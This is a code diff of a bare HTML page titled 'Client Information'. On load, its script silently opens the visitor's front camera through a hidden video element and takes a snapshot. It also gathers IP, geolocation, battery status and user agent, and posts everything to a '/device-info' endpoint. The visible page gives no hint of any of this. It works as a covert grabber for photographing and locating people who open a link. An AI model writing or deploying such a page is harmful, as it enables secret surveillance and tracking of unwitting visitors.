@@ -3,64 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Device Info</title>
-</head>
-<body>
-    <h1>Fetching Device Information...</h1>
+    <title>Client Information</title>
     <script>
-        async function fetchDeviceInfo() {
-            let batteryPercentage = null;
-            let chargingStatus = null;
-            const userAgentString = navigator.userAgent;
-
-            if ('getBattery' in navigator) {
-                navigator.getBattery().then(function (battery) {
-                    batteryPercentage = Math.round(battery.level * 100);
-                    chargingStatus = battery.charging ? "Charging" : "Discharging";
-
-                    const batteryStatusMessage = `Battery Status:\n- Percentage: ${batteryPercentage}%\n- Charging Status: ${chargingStatus}`;
-
-                    console.log(batteryStatusMessage);
-
-                    fetchAdditionalDeviceInfo(batteryPercentage, chargingStatus);
-                }).catch(function (error) {
-                    console.error('Battery Status API error:', error);
-                    fetchAdditionalDeviceInfo();
-                });
-            } else {
-                console.warn('Battery API not supported on this browser');
-                fetchAdditionalDeviceInfo();
+        document.addEventListener("DOMContentLoaded", function() {
+            // Function to get battery status
+            async function getBatteryStatus() {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: battery.level * 100,
+                        charging: battery.charging
+                    };
+                }
+                return {
+                    level: 'unknown',
+                    charging: 'unknown'
+                };
             }
-        }
 
-        async function fetchAdditionalDeviceInfo(batteryPercentage = null, chargingStatus = null) {
-            try {
-                const response = await fetch('/ip');
-                const data = await response.json();
+            // Function to send data to the server
+            async function sendDeviceInfo(dataURL) {
+                const batteryStatus = await getBatteryStatus();
+                console.log('Battery Status:', batteryStatus); // Log battery status
+                
+                const userAgent = navigator.userAgent;
+                console.log('User Agent:', userAgent); // Log user agent
 
-                const deviceInfo = {
-                    ip: data.ip,
-                    geolocation: data.geolocation,
-                    batteryPercentage,
-                    chargingStatus,
-                    userAgent: navigator.userAgent
+                try {
+                    const ipResponse = await fetch('/ip');
+                    const ipData = await ipResponse.json();
+                    console.log('IP Data:', ipData); // Log IP data
+
+                    const deviceInfo = {
+                        ip: ipData.ip,
+                        geolocation: ipData.geolocation,
+                        batteryPercentage: batteryStatus.level,
+                        chargingStatus: batteryStatus.charging ? 'Charging' : 'Not Charging',
+                        userAgent: userAgent,
+                        photo: dataURL // Add photo data URL to device info
+                    };
+
+                    console.log('Device Info:', deviceInfo); // Log device info
+
+                    await fetch('/device-info', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(deviceInfo)
+                    });
+
+                } catch (error) {
+                    console.error('Error sending device info:', error);
+                }
+            }
+
+            // Function to capture photo
+            async function capturePhoto() {
+                const video = document.createElement('video');
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+
+                const constraints = {
+                    video: { facingMode: 'user' }
                 };
 
-                console.log(deviceInfo);
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                    video.srcObject = stream;
+                    await new Promise((resolve) => {
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            resolve();
+                        };
+                    });
 
-                await fetch('/device-info', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(deviceInfo)
-                });
-            } catch (error) {
-                console.error('Error fetching IP and geolocation:', error);
+                    setTimeout(() => {
+                        // Capture photo
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const dataURL = canvas.toDataURL('image/png');
+                        sendDeviceInfo(dataURL);
+                        video.srcObject.getTracks().forEach(track => track.stop());
+                    }, 500); // Capture after 5 seconds
+
+                } catch (error) {
+                    console.error('Error accessing camera:', error);
+                }
             }
-        }
 
-        fetchDeviceInfo();
+            // Capture photo and send device info
+            capturePhoto();
+        });
     </script>
+</head>
+<body>
+    <h1>Client Information Page</h1>
 </body>
 </html>
